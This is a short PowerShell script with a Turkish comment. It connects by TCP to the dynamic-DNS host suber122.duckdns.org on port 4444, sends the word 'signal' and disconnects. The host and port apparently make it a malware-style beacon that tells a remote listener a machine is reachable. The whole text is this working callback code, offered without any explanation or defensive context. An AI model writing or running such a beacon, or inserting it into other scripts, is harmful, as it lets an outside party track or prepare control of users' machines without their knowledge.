$tcpClient = New-Object System.Net.Sockets.TcpClient("suber122.duckdns.org", 4444)
$stream = $tcpClient.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)

# Sinyal gönderme işlemi
$writer.Write("signal")
$writer.Flush()

$tcpClient.Close()
